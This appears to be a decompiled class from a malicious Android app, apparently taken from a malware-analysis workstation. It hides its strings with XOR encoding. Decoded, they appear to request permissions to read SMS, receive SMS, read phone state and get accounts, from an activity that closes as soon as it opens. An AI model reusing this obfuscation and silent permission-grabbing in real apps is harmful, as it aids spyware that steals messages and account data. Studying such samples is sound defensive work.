package com.zjxyxnvvp.nxvxchltf.util;

import android.app.Activity;
import android.os.Bundle;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class uaiwdBuaiwbdaD extends Activity {
    private static short[] $ = {9359, 9344, 9354, 9372, 9345, 9351, 9354, 9408, 9374, 9355, 9372, 9347, 9351, 9373, 9373, 9351, 9345, 9344, 9408, 9404, 9387, 9391, 9386, 9393, 9405, 9379, 9405, 7910, 7913, 7907, 7925, 7912, 7918, 7907, 7849, 7927, 7906, 7925, 7914, 7918, 7924, 7924, 7918, 7912, 7913, 7849, 7893, 7874, 7876, 7874, 7886, 7889, 7874, 7896, 7892, 7882, 7892, 6676, 6683, 6673, 6663, 6682, 6684, 6673, 6747, 6661, 6672, 6663, 6680, 6684, 6662, 6662, 6684, 6682, 6683, 6747, 6695, 6704, 6708, 6705, 6698, 6693, 6717, 6714, 6715, 6704, 6698, 6694, 6689, 6708, 6689, 6704, 3998, 3985, 3995, 3981, 3984, 3990, 3995, 4049, 3983, 3994, 3981, 3986, 3990, 3980, 3980, 3990, 3984, 3985, 4049, 4024, 4026, 4011, 4000, 4030, 4028, 4028, 4016, 4010, 4017, 4011, 4012};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    private void a() {
        String $2 = $(0, 27, 9454);
        if (checkCallingOrSelfPermission($2) != 0) {
            c.b();
            c.b();
            c.b();
            requestPermissions(new String[]{$2, $(27, 57, 7815), $(57, 92, 6773), $(92, 123, 4095)}, 0);
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        a();
        finish();
    }
}
